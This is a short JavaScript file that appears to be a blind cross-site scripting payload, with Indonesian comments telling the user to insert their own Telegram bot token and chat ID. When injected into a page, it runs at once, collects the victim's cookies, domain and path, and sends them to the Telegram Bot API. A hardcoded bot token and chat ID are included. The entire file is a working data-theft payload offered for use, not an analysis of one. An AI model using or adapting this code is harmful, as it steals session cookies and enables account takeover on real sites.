function telegramSend() {
  var botToken = '8434993024:AAFbt5pSZTZgmazecH2vH7yBi2Rx5byx47Q'; // GANTI DENGAN TOKEN BOT ANDA
  var chatId = '6766861678';     // GANTI DENGAN ID CHAT ANDA
  
  var textData = 'XSS+Alert+in+' + document.domain + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-%0d%0a<pre>' + document.location.hostname + document.location.pathname + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document.cookie + '</pre>';

  var xhr = new XMLHttpRequest();      
  xhr.open('GET', 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=HTML', true);      
  xhr.send();
}

telegramSend();
